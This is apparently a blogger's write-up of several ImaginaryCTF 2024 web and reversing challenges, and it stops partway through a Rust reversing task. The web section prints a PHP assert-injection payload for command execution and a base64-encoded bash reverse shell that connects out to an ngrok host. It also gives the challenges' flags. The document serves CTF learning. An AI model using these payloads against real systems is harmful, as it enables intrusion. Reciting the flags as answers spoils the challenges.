<h3> Imaginary CTF 2024 </h3>

![image](https://github.com/user-attachments/assets/39f0b7e9-9548-427f-9e9a-653f6514afd6)

Hello guys, I'm `0x1337` and last night I participated in ImaginaryCTF 

Even though I started really late i'm happy to have least solved some challenges

And in this writeup I'll go through the challenges which I solved

### Web
- Readme
- Journal
- PC2
- Crystals

### Reversing
- Unoriginal
- Rust
- BF
- Absolute Flag Checker
- Watchdog

### Pwn
- Imgstore
- Ropity
- Onewrite


---
---

### Web

#### Readme
![image](https://github.com/user-attachments/assets/83893b67-ce4e-4b9f-94f5-d449f57b339b)

We are given the web instance and a file sharing server which has a compressed archive
![image](https://github.com/user-attachments/assets/f3a804c0-ee26-4ce4-8081-22a17d73342f)

After downloading it I uncompressed it and got this
![image](https://github.com/user-attachments/assets/f3c6e762-d328-414c-af87-d3e05ed34d7f)

So that's the application source code

Opening it in VSCode I saw the flag in the `Dockerfile` 
![image](https://github.com/user-attachments/assets/d980e458-4cfa-4eb3-9ad7-a5f8a71465fc)

It seems this was unintended which lead to the release of `Readme2` i presume

In any case I got the flag

```
Flag: ictf{path_normalization_to_the_rescue}
```

#### Journal
![image](https://github.com/user-attachments/assets/af6b8d8f-f7a3-4b35-96a5-ec9aba56ef8b)

After downloading the zip file from the file sharing server I uncompressed it which gave the source code
![image](https://github.com/user-attachments/assets/8765564e-ae62-48cb-bc62-34548ada272d)

You can ignore the `test.php` as it wasn't there initially (i created it for debugging0

Let's check out the source code but before that it's good practice to check the `Dockerfile`
![image](https://github.com/user-attachments/assets/92d25f25-1bbd-4e93-9b2c-f6b7f20ceff2)

Basically this Dockerfile would install `php:7-apache` then do some web server configuration

And what i mean by that is this:
- Setups the web server files
- Starts Apache HTTP Server in the foreground while setting specific environment variables and user/group permissions. 
- Randomize the flag file name

Ok at this point we know that the `flag.txt` file would be of a random name stored in `/`

That means we might need to get `RCE` to get the name and it's content

Moving on we can check the application source code which is `index.php`
![image](https://github.com/user-attachments/assets/fc9faa9d-7a84-4ec8-bf1b-16afea34e301)

```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");
// 
  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";

?>
```

The code isn't much and basically it would include any file passed to the `file` parameter considering it's valid

So this is an `LFI` sort of challenge!

But the issue here is that before it includes our file it would check for the occurrence of `..` in our input, and that's to prevent us from doing directory transversal

The odd thing here is that it uses `assert` for the check

And one issue about `assert` is that it basically does an `eval()` based on the string passed into it

Ok good we can leverage this to get `RCE` 

In order to do that we need to first escape the `strpos` call and here's how I did that

```
rce' and die(system(ls)) or '
```

I got that payload from [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)

Doing that works and I got the current files in that directory
![image](https://github.com/user-attachments/assets/660f400d-32f5-4639-96b9-935b1adbc568)

To get full command execution I used this:
![image](https://github.com/user-attachments/assets/3cb78497-2753-4913-8f84-d757cff22e90)

```
rce' and die(system($_GET['cmd'])) or '&cmd=ls -al
```

Now we can get the flag file name
![image](https://github.com/user-attachments/assets/bcee56f8-008f-43b9-8837-4276c3e6df12)

And then we concatenate it :)
![image](https://github.com/user-attachments/assets/7fe8a59b-4b3a-49e5-988a-fbff042a9095)

```
http://journal.chal.imaginaryctf.org/?file=rce' and die(system($_GET['cmd'])) or '&cmd=cat /flag-cARdaInFg6dD10uWQQgm.txt
```

Cool we got the flag

```
Flag: ictf{assertion_failed_e3106922feb13b10}
```

#### PC2
![image](https://github.com/user-attachments/assets/116d8819-66d3-4211-b047-99acfddfbd56)

As usual we are given the source which we i already downloaded
![image](https://github.com/user-attachments/assets/ef8b62d3-4651-4f3f-90f3-471919416169)

It's a python web application so let's start by checking the `Dockerfile`
![image](https://github.com/user-attachments/assets/99e031fe-aed3-4208-a51a-803d268eb263)

Nothing much here just some setups

Ok so let's check the app source code
![image](https://github.com/user-attachments/assets/839ad87b-4d76-4d88-b7e0-bde4779becc2)
![image](https://github.com/user-attachments/assets/79ae8be4-ba76-424b-95c9-3e981babeaea)

The only available route is `/` and what it does is this:
- Retrieves the `code` body parameter if the http request method is `POST`
- Calls function `xec()` passing the data body as the argument
- Does some regular expression check and if the pattern check doesn't return `None` it would render the `index.html` template

So far nothing interesting here

Let's check the `xec` function
- It would indent the parameter passed into the function
- Generates a random file name based on the `md5` hash of the code content
- Does some python templating inroder to make it a valid python code
- Makes it executable
- And finally runs the python code

The thing of interest here is that it would use our input value and add it to a template which would be stored as a python code then executed

I copied the `xec` function to know how the final python code would be based on our input and saw this
![image](https://github.com/user-attachments/assets/9623c760-0620-486a-a831-730c8570cd56)

This is how the final code would be:

```python
def main():
    print('hi')

from parse import rgb_parse
print(rgb_parse(main())
```

We can decide to check the `parse.rgp_parse` function but that's not needed because `main()` would be called first and it's the value returned from it that's going to be used in the function

In order words because we have control over what will be executed we can inject our malicious code and it would get executed

Cool!

I decided to just get a reverse shell

First I setup ngrok then base64 encode my reverse shell
![image](https://github.com/user-attachments/assets/75358e96-3dee-42be-bf75-03dfdec28d15)

Now i just need to use the `os` module then access the `system` function to execute shell command

Here's my payload
![image](https://github.com/user-attachments/assets/80c98104-f180-4e15-b47f-dc97006bce31)

```python
import os
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80LnRjcC51cy1jYWwtMS5uZ3Jvay5pby8xNTkxNCAwPiYx | base64 -d | bash')
```

Back to my netcat listener I got a reverse shell
![image](https://github.com/user-attachments/assets/39fcafbb-b047-49be-b1e6-7df4d7af405d)

```
Flag: ictf{d1_color_picker_fr_2ce0dd3d}
```

#### Crystals
![image](https://github.com/user-attachments/assets/673cd703-5455-4266-bc05-3a40e2cbd45e)

After downloading the source code I checked it out

The `Dockerfile` shows it's running a ruby web server
![image](https://github.com/user-attachments/assets/3becf51e-06fc-41d6-a720-c93cfb64a9e2)

The docker compose file shows the flag is stored as the `hostname`
![image](https://github.com/user-attachments/assets/cfb438b8-1278-43f6-b519-44a7781e7d63)

The main application source code shows only one route available which is `/` and what it does is just to include the `index.erb` file
![image](https://github.com/user-attachments/assets/ca88b02e-2469-4873-b5c4-0aa764c72f94)

Ok what exactly do we do?

Since the flag is stored as the `hostname` I tried to leak it by causing an error

And to achieve that I sent an invalid request

To do that I used `curl` because using my web browser ended up urlencoding the path i tried accessing
![image](https://github.com/user-attachments/assets/c1c690ff-0815-4ead-808c-ed6d142e1785)

```
curl 'http://crystals.chal.imaginaryctf.org/`'
```

And with that I got the flag

```
Flag: ictf{seems_like_you_broke_it_pretty_bad_76a87694}
```

---
---

### Reversing

#### Unoriginal
![image](https://github.com/user-attachments/assets/d3758826-a91d-4f4c-8393-29d3c520740d)

I downloaded the executable and checked what type of file it is
![image](https://github.com/user-attachments/assets/2899bd68-c53a-45d0-a846-e46a8469ee95)

Ok a x64 binary which is not stripped

I ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/40fccd39-a8e2-446d-ac8e-890ad98e5185)

It requires us to give it the right flag

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/45f46868-70a8-49bc-bfd2-a612ea87bf12)

So reading through the disassembly we see that it would:
- Print out the msg
- Receive our input which is stored in `rbp+s1`
- Initializes a counter variable `rbp+var_44` to `0`
- It then jumps to `loc_122E` which checks if the counter is equal to `0x2f`
- If that counter is less than the expected value it jumps to `loc_1212`
- And what that does is basically performing a xor operation on the input value at the counter index with 5
- But if the length comparism doesn't return True with will then compare the our encrypted value against a hardcoded one
  - If this `strcmp` call returns `True` that means we got the flag else that's the wrong flag
 

At this point it's clear that the encryption logic is basically using xor with key of 5 against our input and then comparing it against a hardcoded encrypted flag

To reverse it we just need to xor the encrypted flag with 5

I used cyberchef to do that
![image](https://github.com/user-attachments/assets/a3d589b4-52d4-40e3-83bd-83fd27740c4b)

```
Flag: ictf{just_another_flag_checker_a3465d5e5ee234ba}
```

#### Rust
![image](https://github.com/user-attachments/assets/eac743f7-2471-4b3b-8d1e-0c79774595c8)

After downloading attached file I saw it was a binary and an output file

Checking the file type of the executable shows this
![image](https://github.com/user-attachments/assets/9a09749c-92c3-4a99-b452-6147d4c4bcf2)

So we are working with a 64bits binary which is dynamically linked and not stripped

And good enough we have debug_info enabled which means there would debug symbols

The other file attached is output.txt, which contains the output from when the author ran the program against the flag

Let's also run it to get an overview of what it does
![image](https://github.com/user-attachments/assets/5361b299-5fde-452b-938a-62b484ed6561)

Ok good at this point we know that the encryption algorithm always would return the same value if the key is the same

Time to reverse it

Using Ghidra I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/338fda27-fd26-46a1-bb48-d47dfe0928d9)

Because `debug_info` is enabled, it makes life much easier for me since I'm not familiar with rust internals or the Rust programming language. This way, I won't end up trying to reverse-engineer an internal implementation 😅

Ok let's continue

```c
void main(int param_1,u8 **param_2)

{
  std::rt::lang_start<()>(rust::rust::main,(long)param_1,param_2,0);
  return;
}
```

So it calls `rust::rust::main` and here's the decompilation
![image](https://github.com/user-attachments/assets/f9650417-f2cb-4301-9a53-1cdc9f1676a1)

Basically it would print out the text, receive the msg and the key then call the `encrypt` function

```c
encrypt((char *)local_50._8_8_,stack0xffffffffffffffb8.length);
```

We can assume that the `encrypt` function would require the `msg & key` as the parameter but to confirm I set a breakpoint at the `call` to this function
![image](https://github.com/user-attachments/assets/2e26eca8-7b9d-4af7-85d1-2a56e0980fd0)
![image](https://github.com/user-attachments/assets/5eafaf61-08a8-4c8d-83a0-623ab4031b88)

Ok good our assumption was almost right but this correct calling convention is this:

```c
encrypt(char *msg, int msg_length, int key);
```

The reason why Ghidra didn't get that right is because the data type wasn't set correctly, if I'm not mistaken

Moving on, let us check out the encrypt function decompilation
![image](https://github.com/user-attachments/assets/bb044728-318d-4b29-9f59-fe5bd3d628f6)

Wait wtf the parameters to this function is just 2?

```c
rust::rust::encrypt(char *message,int key)
```

And from the debug symbol it shows the right way it's called

```rust
void encrypt(&str message, u128 key)
```

Oh well, let's continue still.













